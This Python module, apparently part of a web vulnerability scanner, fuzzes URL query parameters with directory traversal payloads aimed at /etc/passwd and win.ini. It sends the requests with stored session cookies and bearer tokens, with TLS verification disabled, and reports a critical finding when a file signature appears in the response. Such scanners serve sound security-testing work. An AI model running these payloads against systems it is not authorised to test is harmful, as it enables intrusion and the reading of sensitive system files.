import requests
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
from scanners.utils import GLOBAL_COOKIE, GLOBAL_BEARER

def run_lfi_fuzzer(url):
    """
    Local File Inclusion (LFI) and Directory Traversal fuzzer.
    Zero false positives by checking exact file signatures (/etc/passwd, win.ini).
    """
    findings = []
    if "?" not in url: return findings
    
    headers = {}
    if GLOBAL_COOKIE: headers["Cookie"] = GLOBAL_COOKIE
    if GLOBAL_BEARER: headers["Authorization"] = f"Bearer {GLOBAL_BEARER}"

    parsed = urlparse(url)
    params = parse_qsl(parsed.query)
    
    payloads = [
        ("../../../../../../../../etc/passwd", "root:x:0:0:"),
        ("../../../../../../../../windows/win.ini", "[extensions]")
    ]
    
    for i, (k, v) in enumerate(params):
        for payload, signature in payloads:
            test_params = params.copy()
            test_params[i] = (k, payload)
            
            test_query = urlencode(test_params)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
            
            try:
                r = requests.get(test_url, headers=headers, timeout=5, verify=False)
                if signature in r.text:
                    findings.append({
                        "type": "LOCAL_FILE_INCLUSION",
                        "url": test_url,
                        "severity": "CRITICAL",
                        "confidence": "HIGH",
                        "verified": True,
                        "detail": f"Critical LFI/Directory Traversal! Extracted local system file via parameter `{k}` using payload `{payload}`."
                    })
                    return findings
            except Exception: pass
            
    return findings
